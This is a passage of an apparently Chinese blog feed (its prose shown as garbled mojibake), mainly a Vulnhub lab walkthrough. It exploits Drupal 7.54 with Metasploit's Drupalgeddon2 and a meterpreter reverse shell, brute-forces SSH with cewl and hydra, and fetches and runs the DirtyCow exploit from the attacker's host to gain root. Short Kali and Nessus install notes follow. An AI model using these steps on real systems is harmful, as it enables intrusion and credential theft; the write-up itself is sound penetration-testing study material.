class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.144:1898</span><br><br>-----------------<br>DIRB v2.22    <br>By The Dark Raver<br>-----------------<br><br>START_TIME: Sat Apr 30 06:22:29 2022<br>URL_BASE: http://192.168.135.144:1898/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br><br>-----------------<br><br>GENERATED WORDS: 4612                                                          <br><br>---- Scanning URL: http://192.168.135.144:1898/ ----<br>==&gt; DIRECTORY: http://192.168.135.144:1898/includes/<br>+ http://192.168.135.144:1898/index.php (CODE:200|SIZE:11469)<br>==&gt; DIRECTORY: http://192.168.135.144:1898/misc/<br>==&gt; DIRECTORY: http://192.168.135.144:1898/modules/<br>==&gt; DIRECTORY: http://192.168.135.144:1898/profiles/<br>+ http://192.168.135.144:1898/robots.txt (CODE:200|SIZE:2189)<br>==&gt; DIRECTORY: http://192.168.135.144:1898/scripts/<br>+ http://192.168.135.144:1898/server-status (CODE:403|SIZE:297)<br>==&gt; DIRECTORY: http://192.168.135.144:1898/sites/<br>==&gt; DIRECTORY: http://192.168.135.144:1898/themes/<br>+ http://192.168.135.144:1898/web.config (CODE:200|SIZE:2200)<br>+ http://192.168.135.144:1898/xmlrpc.php (CODE:200|SIZE:42)<br><br>---- Entering directory: http://192.168.135.144:1898/includes/ ----<br>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        <br>    (Use mode &#x27;-w&#x27; if you want to scan it anyway)<br>    <br>-----------------<br><br>END_TIME: Sat Apr 30 06:22:34 2022<br>DOWNLOADED: 4612 - FOUND: 5<br></code></pre></td></tr></table></figure><p>è¿›å…¥ robots.txtï¼Œçœ‹åˆ° CHANGELOG.txtï¼Œæ‰“å¼€å¾—çŸ¥ CSM æ¡†æ¶åŠç‰ˆæœ¬å·ï¼šDrupal 7.54, 2017-02-01</p><p>å¯ä»¥åœ¨ MSF ä¸Šæ ¹æ® Drupal æ¼æ´è„šæœ¬è¿›è¡Œæƒé™è·å–ï¼ˆä½æƒé™ï¼‰ã€‚</p><h2 id="äºŒã€æƒé™è·å–"><a href="#äºŒã€æƒé™è·å–" class="headerlink" title="äºŒã€æƒé™è·å–"></a>äºŒã€æƒé™è·å–</h2><h3 id="M1ã€Drupalæ¼æ´"><a href="#M1ã€Drupalæ¼æ´" class="headerlink" title="M1ã€Drupalæ¼æ´"></a>M1ã€Drupalæ¼æ´</h3><p>æ‰“å¼€msfï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> msfconsole</span><br></code></pre></td></tr></table></figure><p>åœ¨ msf ä¸­æœä¸€ä¸‹ payloadï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">msf6 &gt; search drupal<br><br>Matching Modules<br>================<br><br><span class="hljs-meta">   #</span><span class="bash">  Name                                           Disclosure Date  Rank       Check  Description</span><br>   -  ----                                           ---------------  ----       -----  -----------<br>   0  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution<br>   1  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection<br>   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection<br>   3  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection<br>   4  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution<br>   5  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE<br>   6  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration<br>   7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution<br><br>Interact with a module by name or index. For example info 7, use 7 or use exploit/unix/webapp/php_xmlrpc_eval<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨æœ€æ–°çš„ã€å®¹æ˜“åˆ©ç”¨çš„1å·payloadï¼Œç›´æ¥æ‹¿åˆ°æœåŠ¡å™¨æƒé™</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs shell">msf6 &gt; use 1<br>[*] No payload configured, defaulting to php/meterpreter/reverse_tcp<br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; show options<br><br>Module options (exploit/unix/webapp/drupal_drupalgeddon2):<br><br>   Name         Current Setting  Required  Description<br>   ----         ---------------  --------  -----------<br>   DUMP_OUTPUT  false            no        Dump payload command output<br>   PHP_FUNC     passthru         yes       PHP function to execute<br>   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]<br>   RHOSTS                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit<br>   RPORT        80               yes       The target port (TCP)<br>   SSL          false            no        Negotiate SSL/TLS for outgoing connections<br>   TARGETURI    /                yes       Path to Drupal install<br>   VHOST                         no        HTTP server virtual host<br><br><br>Payload options (php/meterpreter/reverse_tcp):<br><br>   Name   Current Setting  Required  Description<br>   ----   ---------------  --------  -----------<br>   LHOST  192.168.135.141  yes       The listen address (an interface may be specified)<br>   LPORT  4444             yes       The listen port<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Automatic (PHP In-Memory)<br><br><br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set RHOST 192.168.135.144<br>RHOST =&gt; 192.168.135.144<br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set RPORT 1898<br>RPORT =&gt; 1898<br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit<br><br>[*] Started reverse TCP handler on 192.168.135.141:4444 <br>[*] Running automatic check (&quot;set AutoCheck false&quot; to disable)<br>[+] The target is vulnerable.<br>[*] Sending stage (39282 bytes) to 192.168.135.144<br>[*] Meterpreter session 1 opened (192.168.135.141:4444 -&gt; 192.168.135.144:44758) at 2022-04-30 07:36:17 -0400<br><br>meterpreter &gt; uname -a<br>[-] Unknown command: uname<br>meterpreter &gt; id<br>[-] Unknown command: id<br>meterpreter &gt; pwd<br>/var/www/html<br>meterpreter &gt; <br></code></pre></td></tr></table></figure><p>æˆåŠŸæ‹¿åˆ° session ä¼šè¯ï¼Œè¾“å…¥ shell è¿›å…¥ shell ç»ˆç«¯ï¼Œå†åˆ©ç”¨ python è·å¾—ä¸€ä¸ª TTY ç»ˆç«¯ã€‚</p><p>å¯åŠ¨ shellï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> shell</span><br><span class="hljs-meta">$</span><span class="bash"> python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></code></pre></td></tr></table></figure><h3 id="M2ã€SSHçˆ†ç ´"><a href="#M2ã€SSHçˆ†ç ´" class="headerlink" title="M2ã€SSHçˆ†ç ´"></a>M2ã€SSHçˆ†ç ´</h3><p>æ­£å¸¸è®¿é—®1898 ç«¯å£ï¼Œå‘ç°éšè—ç›®å½• <code>http://192.168.31.35:1898/?q=node/2</code> ï¼Œé‡Œé¢æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼šaudio.m4aã€qrc.png</p><p>è®¿é—® <code>http://192.168.31.35:1898/audio.m4a</code>ï¼Œè·å–åˆ° <strong><code>username:tiago</code></strong></p><p>ä½¿ç”¨ cewl å¯¹ <code>http://192.168.31.35:1898/?q=node/1</code> ç«™ç‚¹ç”Ÿæˆå­—å…¸ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cewl http://192.168.31.35:1898/?q=node/1 -w password.txt</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ hydra è¿›è¡Œçˆ†ç ´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> hydra -l tiago -P password.txt 192.168.135.144 ssh</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ° <strong><code>password:Virgulino</code></strong></p><p>è¿›è¡Œsshç™»å½•ï¼Œå¾—åˆ°ä¸€ä¸ªä½æƒé™ç”¨æˆ·ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh tiago@192.168.135.144<br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€æƒé™æå‡"><a href="#ä¸‰ã€æƒé™æå‡" class="headerlink" title="ä¸‰ã€æƒé™æå‡"></a>ä¸‰ã€æƒé™æå‡</h2><h3 id="1ã€æ‰«æå†…æ ¸æ¼æ´"><a href="#1ã€æ‰«æå†…æ ¸æ¼æ´" class="headerlink" title="1ã€æ‰«æå†…æ ¸æ¼æ´"></a>1ã€æ‰«æå†…æ ¸æ¼æ´</h3><p>é€šè¿‡ python å¼€å¯æœ¬åœ° http æœåŠ¡ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python -m SimpleHTTPServer 8888</span><br></code></pre></td></tr></table></figure><p>åœ¨åˆšåˆšè·å–çš„ä½æƒé™ç”¨æˆ·ä¸­è·å–æ‰«æè„šæœ¬ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wget http://192.168.135.141:8888/les.sh</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œå¾—åˆ°å†…æ ¸ç›¸å…³æ¼æ´ä¿¡æ¯ï¼Œå‘ç°å¯é€šè¿‡ DirtyCow è¿›è¡Œææƒã€‚</p><h3 id="2ã€å†…æ ¸æ¼æ´ææƒ"><a href="#2ã€å†…æ ¸æ¼æ´ææƒ" class="headerlink" title="2ã€å†…æ ¸æ¼æ´ææƒ"></a>2ã€å†…æ ¸æ¼æ´ææƒ</h3><p>æŸ¥æ‰¾ DirtyCow ææƒè„šæœ¬ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit dirty</span><br>--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                                                                               |  Path<br>--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>Linux Kernel - &#x27;The Huge Dirty Cow&#x27; Overwriting The Huge Zero Page (1)                                                                       | linux/dos/43199.c<br>Linux Kernel - &#x27;The Huge Dirty Cow&#x27; Overwriting The Huge Zero Page (2)                                                                       | linux/dos/44305.c<br>Linux Kernel 2.6.22 &lt; 3.9 (x86/x64) - &#x27;Dirty COW /proc/self/mem&#x27; Race Condition Privilege Escalation (SUID Method)                           | linux/local/40616.c<br>Linux Kernel 2.6.22 &lt; 3.9 - &#x27;Dirty COW /proc/self/mem&#x27; Race Condition Privilege Escalation (/etc/passwd Method)                              | linux/local/40847.cpp<br>Linux Kernel 2.6.22 &lt; 3.9 - &#x27;Dirty COW PTRACE_POKEDATA&#x27; Race Condition (Write Access Method)                                                 | linux/local/40838.c<br>Linux Kernel 2.6.22 &lt; 3.9 - &#x27;Dirty COW&#x27; &#x27;PTRACE_POKEDATA&#x27; Race Condition Privilege Escalation (/etc/passwd Method)                           | linux/local/40839.c<br>Linux Kernel 2.6.22 &lt; 3.9 - &#x27;Dirty COW&#x27; /proc/self/mem Race Condition (Write Access Method)                                                  | linux/local/40611.c<br>Qualcomm Android - Kernel Use-After-Free via Incorrect set_page_dirty() in KGSL                                                              | android/dos/46941.txt<br>Quick and Dirty Blog (qdblog) 0.4 - &#x27;categories.php&#x27; Local File Inclusion                                                                    | php/webapps/4603.txt<br>Quick and Dirty Blog (qdblog) 0.4 - SQL Injection / Local File Inclusion                                                                     | php/webapps/3729.txt<br>snapd &lt; 2.37 (Ubuntu) - &#x27;dirty_sock&#x27; Local Privilege Escalation (1)                                                                          | linux/local/46361.py<br>snapd &lt; 2.37 (Ubuntu) - &#x27;dirty_sock&#x27; Local Privilege Escalation (2)                                                                          | linux/local/46362.py<br>--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure><p>é€‰æ‹© 40847.cpp è„šæœ¬å¹¶æ‹·è´åˆ°å½“å‰ç›®å½•ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cp /usr/share/exploitdb/exploits/linux/<span class="hljs-built_in">local</span>/40847.cpp ./</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡ python å¼€å¯æœ¬åœ° http æœåŠ¡ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python -m SimpleHTTPServer 8888</span><br></code></pre></td></tr></table></figure><p>åœ¨åˆšåˆšè·å–çš„ä½æƒé™ç”¨æˆ·ä¸­è·å–è¯¥è„šæœ¬ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wget http://192.168.135.141:8888/40847.cpp</span><br></code></pre></td></tr></table></figure><p>è¿›è¡Œç¼–è¯‘ã€è¿è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="hljs-meta">$</span><span class="bash"> ./dcow</span><br></code></pre></td></tr></table></figure><ol><li>-Wall ä¸€èˆ¬ä½¿ç”¨è¯¥é€‰é¡¹ï¼Œå…è®¸å‘å‡ºGCCèƒ½å¤Ÿæä¾›çš„æ‰€æœ‰æœ‰ç”¨çš„è­¦å‘Š</li><li>-pedantic å…è®¸å‘å‡ºANSI/ISO Cæ ‡å‡†æ‰€åˆ—å‡ºçš„æ‰€æœ‰è­¦å‘Š</li><li>-O2ç¼–è¯‘å™¨çš„ä¼˜åŒ–é€‰é¡¹çš„4ä¸ªçº§åˆ«ï¼Œ-O0è¡¨ç¤ºæ²¡æœ‰ä¼˜åŒ–,-O1ä¸ºç¼ºçœå€¼ï¼Œ-O3ä¼˜åŒ–çº§åˆ«æœ€é«˜</li><li>-std=c++11å°±æ˜¯ç”¨æŒ‰C++2011æ ‡å‡†æ¥ç¼–è¯‘çš„</li><li>-pthread åœ¨Linuxä¸­è¦ç”¨åˆ°å¤šçº¿ç¨‹æ—¶ï¼Œéœ€è¦é“¾æ¥pthreadåº“</li><li>-o dcow gccç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶,åå­—ä¸ºdcow</li></ol><p>è·å–åˆ° root çš„å¯†ç ï¼Œé€šè¿‡ ssh ç™»å½•å³å¯ã€‚</p><h2 id="å››ã€æ€»ç»“"><a href="#å››ã€æ€»ç»“" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h2><p>1ã€cewlã€hydraã€msf ä½¿ç”¨</p><p>2ã€ä¿¡æ¯æ”¶é›†ï¼šnmap æ‰«æå¯¹æ–¹ç«¯å£å’ŒæœåŠ¡ï¼Œdirb çˆ†ç ´ç½‘ç«™ç›®å½•</p><p>3ã€æƒé™è·å–ï¼šç½‘ç«™cmsæ¼æ´ï¼Œå¾—åˆ° www-data shellï¼›ç”¨æˆ·çˆ†ç ´ï¼Œå¾—åˆ°ä¸€èˆ¬ç”¨æˆ·</p><p>4ã€ææƒï¼šles.sh æ‰«æå†…æ ¸æ¼æ´ï¼Œé€šè¿‡ dirtycow å†…æ ¸æ¼æ´ææƒï¼Œä¸¤æœºä¼ è¾“æ–‡ä»¶ï¼Œç¼–è¯‘ã€è¿è¡Œï¼Œå¾—åˆ° root shell</p><p>5ã€å®Œæ•´çš„æ¸—é€æµç¨‹ï¼šå¤–ç½‘ -&gt; å†…ç½‘ï¼ˆç½‘ç«™æ¼æ´ -&gt; www-data shell -&gt; å†…æ ¸æ‰«æ -&gt; å†…æ ¸æ¼æ´ -&gt; å†…æ ¸ææƒï¼‰</p><p>6ã€ç½‘ç«™æ‰«æï¼š2ç±»å·¥å…·ï¼ˆæ‰«æç±»AWVSã€çˆ¬è™«ç±»xrayï¼ˆddosiï¼‰ï¼‰</p><h2 id="äº”ã€å…¶ä»–"><a href="#äº”ã€å…¶ä»–" class="headerlink" title="äº”ã€å…¶ä»–"></a>äº”ã€å…¶ä»–</h2><p><strong>Metasploitâ€”ä¸Šä¼ /ä¸‹è½½æ–‡ä»¶ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> upload file      <span class="hljs-comment">#å‘ç›®æ ‡ç³»ç»Ÿä¸Šä¼ æ–‡ä»¶</span></span><br><span class="hljs-meta">$</span><span class="bash"> download file    <span class="hljs-comment">#ä»ç›®æ ‡ç³»ç»Ÿä¸­ä¸‹è½½æ–‡ä»¶</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> æŒ‰ ctrl+c è¿”å›æ§åˆ¶å°</span><br><span class="hljs-meta">#</span><span class="bash"> upload ï¼ˆfrom æœ¬æœºæ–‡ä»¶è·¯å¾„ï¼‰ ï¼ˆto ç›®æ ‡è·¯å¾„ï¼‰</span><br><span class="hljs-meta">#</span><span class="bash"> æ‰§è¡Œå‘½ä»¤ä¸Šä¼ cppæ–‡ä»¶åˆ°/tmpç›®å½•ä¸‹ï¼Œå› ä¸ºè¯¥ç›®å½•ä¸€èˆ¬å¯å†™</span><br><span class="hljs-meta">$</span><span class="bash"> upload /usr/share/exploitdb/exploits/linux/<span class="hljs-built_in">local</span>/40847.cpp /tmp</span><br></code></pre></td></tr></table></figure><p><strong>SSHâ€”æ‹·è´æ–‡ä»¶ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> scp file user@ip:/tmp</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> æ‹·è´æ–‡ä»¶å¤¹</span><br><span class="hljs-meta">#</span><span class="bash"> æŠŠå½“å‰æ–‡ä»¶å¤¹tempAæ‹·è´åˆ°ç›®æ ‡æœåŠ¡å™¨10.127.40.25 æœåŠ¡å™¨çš„ /tmp/wang/æ–‡ä»¶å¤¹ä¸‹</span><br><span class="hljs-meta">#</span><span class="bash"> å…¶ä¸­wasadminæ˜¯ç›®æ ‡æœåŠ¡å™¨çš„ç”¨æˆ·åï¼Œæ‰§è¡Œå‘½ä»¤æç¤ºè¾“å…¥å¯†ç ï¼Œç„¶åè¾“å…¥å¯†ç å³å¯</span><br><span class="hljs-meta">$</span><span class="bash"> scp -r /tmp/tempA/ wasadmin@10.127.40.25:/tmp/wang/</span> <br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> æ‹·è´æ–‡ä»¶</span><br><span class="hljs-meta">#</span><span class="bash"> æŠŠå½“å‰æ–‡ä»¶tempA.txtæ‹·è´åˆ°ç›®æ ‡æœåŠ¡å™¨10.127.40.25 æœåŠ¡å™¨çš„ /tmp/wang/æ–‡ä»¶å¤¹ä¸‹</span><br><span class="hljs-meta">$</span><span class="bash"> scp /tmp/tempA.txt wasadmin@10.127.40.25:/tmp/wang/</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kali</title>
    <link href="/2022/04/24/Linux/Kali/Kali/"/>
    <url>/2022/04/24/Linux/Kali/Kali/</url>
    
    <content type="html"><![CDATA[<h2 id="kali-ä¸‹è½½åœ°å€"><a href="#kali-ä¸‹è½½åœ°å€" class="headerlink" title="kali ä¸‹è½½åœ°å€"></a>kali ä¸‹è½½åœ°å€</h2><p>å®˜ç½‘ï¼š<a href="https://www.kali.org/get-kali/">Get Kali | Kali Linux</a></p><p>é•œåƒï¼š<a href="http://cdimage.kali.org/">Index of / (kali.org)</a></p><p>VM Wareï¼š<a href="https://kali.download/virtual-images/">Index of /virtual-images/ (kali.download)</a></p>]]></content>
    
    
    <categories>
      
      <category>Kali</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>Kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kaliå®‰è£…Nessus</title>
    <link href="/2022/04/02/Linux/Kali/kali%E5%AE%89%E8%A3%85Nessus/"/>
    <url>/2022/04/02/Linux/Kali/kali%E5%AE%89%E8%A3%85Nessus/</url>
    
    <content type="html"><![CDATA[<h2 id="Kaliå®‰è£…Nessus"><a href="#Kaliå®‰è£…Nessus" class="headerlink" title="Kaliå®‰è£…Nessus"></a>Kaliå®‰è£…Nessus</h2><blockquote><p><strong>è½¬è‡ªï¼š</strong><a href="https://zhuanlan.zhihu.com/p/395459622">é»‘å®¢å·¥å…·ä¹‹Nessusè¯¦ç»†ä½¿ç”¨æ•™ç¨‹ - çŸ¥ä¹ (zhihu.com)</a></p><p><strong>å·¥å…·æ–‡ç« åˆé›†ï¼š</strong><a href="https://zhuanlan.zhihu.com/p/401413938">é»‘å®¢è€é¸Ÿ-ä¹é’ï¼šä¸€æ–‡æ•™ä½ å­¦ä¼šé»‘å®¢å¿…å¤‡å®‰å…¨å·¥å…·</a></p></blockquote><h3 id="ä¸€ã€Nessusç®€ä»‹"><a href="#ä¸€ã€Nessusç®€ä»‹" class="headerlink" title="ä¸€ã€Nessusç®€ä»‹"></a>ä¸€ã€Nessusç®€ä»‹</h3><p>Nessuså·ç§°æ˜¯ä¸–ç•Œä¸Šæœ€æµè¡Œçš„æ¼æ´æ‰«æç¨‹åºï¼Œå…¨ä¸–ç•Œæœ‰è¶…è¿‡75000ä¸ªç»„ç»‡åœ¨ä½¿ç”¨å®ƒã€‚è¯¥å·¥å…·æä¾›å®Œæ•´çš„ç”µè„‘æ¼æ´æ‰«ææœåŠ¡ï¼Œå¹¶éšæ—¶æ›´æ–°å…¶æ¼æ´æ•°æ®åº“ã€‚Nessusä¸åŒäºä¼ ç»Ÿçš„æ¼æ´æ‰«æè½¯ä»¶ï¼ŒNessuså¯åŒæ—¶åœ¨æœ¬æœºæˆ–è¿œç«¯ä¸Šé¥æ§ï¼Œè¿›è¡Œç³»ç»Ÿçš„æ¼æ´åˆ†ææ‰«æã€‚Nessusä¹Ÿæ˜¯æ¸—é€æµ‹è¯•é‡è¦å·¥å…·ä¹‹ä¸€</p><h3 id="äºŒã€Nessuså®‰è£…"><a href="#äºŒã€Nessuså®‰è£…" class="headerlink" title="äºŒã€Nessuså®‰è£…"></a>äºŒã€Nessuså®‰è£…</h3><p>1ã€ä¸‹è½½è½¯ä»¶åŒ…</p><p>è¿›å…¥å®˜ç½‘ä¸‹è½½ï¼š<a href="https://www.tenable.com/downloads/nessus?loginAttempted=true">Download Nessus | TenableÂ®</a></p><p>2ã€é€‰æ‹© <code>I agree</code></p><p>3ã€å°†ä¸‹è½½çš„è½¯ä»¶åŒ…æ‹–åˆ° Kali ä¸­</p><p>4ã€å®‰è£… Nessus</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo dpkg -i Nessus-10.1.2-debian6_amd64.deb <br></code></pre></td></tr></table></figure><p>5ã€å¯åŠ¨Nessus</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ /bin/systemctl start nessusd.service<br></code></pre></td></tr></table></figure><p>6ã€ä½¿ç”¨æµè§ˆå™¨è®¿é—® <code>https://kali:8834</code> ï¼Œè¿›è¡Œè¿æ¥</p><p>7ã€è·å–æ¿€æ´»ç ã€è¾“å…¥æ¿€æ´»ç ã€æ³¨å†Œä¸€ä¸ªè´¦å·</p><p>8ã€å¼€å§‹è¯»æ¡</p><p>9ã€æç¤ºä¸‹è½½å¤±è´¥</p><p>10ã€å›åˆ° kali ä¸Šè¾“å…¥ä¸‹é¢è¿™æ¡å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo /opt/nessus/sbin/nessuscli update<br></code></pre></td></tr></table></figure><p>å¼€å§‹ä¸‹è½½æ’ä»¶</p><p>11ã€é‡æ–°å®‰è£… Nessusï¼Œé‡æ–°å¯åŠ¨ Nessusï¼Œåˆå¼€å§‹è¯»æ¡</p><p>12ã€ç„¶åè¾“å…¥ç”¨æˆ·åå¯†ç è¿›å…¥ Nessus</p>]]></content>
    
    
    <categories>
      
      <category>Kali</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>Kali</tag>
      
      <tag>Nessus</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>recon-ng v5.1.1å®‰è£…æ¨¡å—</title>
    <link href="/2022/03/20/Linux/Kali/%E5%AE%89%E8%A3%85recon-ng%E6%A8%A1%E5%9D%97/"/>
    <url>/2022/03/20/Linux/Kali/%E5%AE%89%E8%A3%85recon-ng%E6%A8%A1%E5%9D%97/</url>
    
